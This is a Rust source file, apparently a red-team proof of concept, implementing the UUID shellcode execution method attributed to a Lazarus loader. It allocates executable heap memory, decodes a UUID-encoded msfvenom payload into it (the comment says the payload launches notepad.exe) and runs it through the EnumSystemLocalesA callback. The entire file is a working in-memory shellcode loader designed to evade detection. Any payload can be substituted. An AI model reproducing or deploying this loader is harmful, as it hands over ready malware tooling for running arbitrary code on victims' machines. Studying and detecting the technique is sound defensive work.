/*
    Author: Furkan Ayar, Twitter: @frknayar
    License: BSD 3-Clause
    This is Rust implementation of UUID Shellcode execution from HEAP memory area which has been seen in the wild by lazarus loader.
    References:
        - https://research.nccgroup.com/2021/01/23/rift-analysing-a-lazarus-shellcode-execution-method/
        - https://blog.sunggwanchoi.com/eng-uuid-shellcode-execution/
        - https://gist.github.com/rxwx/c5e0e5bba8c272eb6daa587115ae0014#file-uuid-c
*/
extern crate winapi;
extern crate bindings;
extern crate windows;

use std::str;
use std::process;
use std::mem::transmute;
use std::ffi::CString;
use winapi::um::heapapi::{HeapCreate, HeapAlloc};
use winapi::um::handleapi::CloseHandle;
use winapi::um::winnls::{EnumSystemLocalesA, LOCALE_ENUMPROCA};
use winapi::um::winnt::{HEAP_CREATE_ENABLE_EXECUTE};
use winapi::shared::basetsd::DWORD_PTR;
use winapi::shared::ntstatus::STATUS_SUCCESS;
use windows::Guid;
use bindings::Windows::Win32::System::Rpc::{RPC_STATUS, UuidFromStringA};

fn main() {
	
	println!("[*] UUID Shellcode Execution");
	// msfvenom -a x64 -p windows/x64/exec CMD=notepad.exe EXITFUNC=thread
	const SIZE: usize = 18;
	let uuidarr: [&str; SIZE] = [ 
 		"e48348fc-e8f0-00c0-0000-415141505251",
		"d2314856-4865-528b-6048-8b5218488b52",
		"728b4820-4850-b70f-4a4a-4d31c94831c0",
 		"7c613cac-2c02-4120-c1c9-0d4101c1e2ed",
		"48514152-528b-8b20-423c-4801d08b8088",
		"48000000-c085-6774-4801-d0508b481844",
		"4920408b-d001-56e3-48ff-c9418b348848",
		"314dd601-48c9-c031-ac41-c1c90d4101c1",
		"f175e038-034c-244c-0845-39d175d85844",
		"4924408b-d001-4166-8b0c-48448b401c49",
		"8b41d001-8804-0148-d041-5841585e595a",
		"59415841-5a41-8348-ec20-4152ffe05841",
 		"8b485a59-e912-ff57-ffff-5d48ba010000",
 		"00000000-4800-8d8d-0101-000041ba318b",
 		"d5ff876f-e0bb-2a1d-0a41-baa695bd9dff",
 		"c48348d5-3c28-7c06-0a80-fbe07505bb47",
 		"6a6f7213-5900-8941-daff-d56e6f746570",
		"652e6461-6578-0000-0000-000000000000" ];
	
	unsafe {
		// Creating and Allocating Heap Memory
		println!("[*] Allocating Heap Memory");
		let h_heap = HeapCreate(HEAP_CREATE_ENABLE_EXECUTE, 0, 0);
		let h_addr = HeapAlloc(h_heap, 0, 0x100000);
			
		let mut p_addr = h_addr as DWORD_PTR;
		if p_addr != STATUS_SUCCESS as usize {
			println!("[+] Heap Memory is Allocated at {:#x}", p_addr);
		} else {
			println!("[-] Heap Alloc Error !");
			process::exit(0x0001);
		}
		
		println!("[*] UUID Array size is {}", SIZE);
		// Planting Shellcode From UUID Array onto Allocated Heap Memory
		for i in 0..SIZE {
			let cstr = CString::new(uuidarr[i]).unwrap();
			let g_addr = cstr.as_ptr() as *mut u8;
			let status: RPC_STATUS = UuidFromStringA(g_addr, p_addr as *mut Guid);
			if status != RPC_STATUS::from(0) {
				if status == RPC_STATUS::from(1705) {
					println!("[-] Invalid UUID String Detected at {:?}", g_addr);
					process::exit(0x0001);
				} else {
					println!("[-] Something Went Wrong, Error Code: {:?}", status);
				}
			}
			p_addr += 16;
		}
		println!("[+] Shellcode is successfully placed between {:#x} and {:#x}", h_addr as DWORD_PTR, p_addr);

		// Calling the Callback Function
		println!("[*] Calling the Callback Function ...");
		EnumSystemLocalesA(transmute::<*mut winapi::ctypes::c_void, LOCALE_ENUMPROCA>(h_addr), 0);
		CloseHandle(h_heap);
		process::exit(0x0000);
	}
}
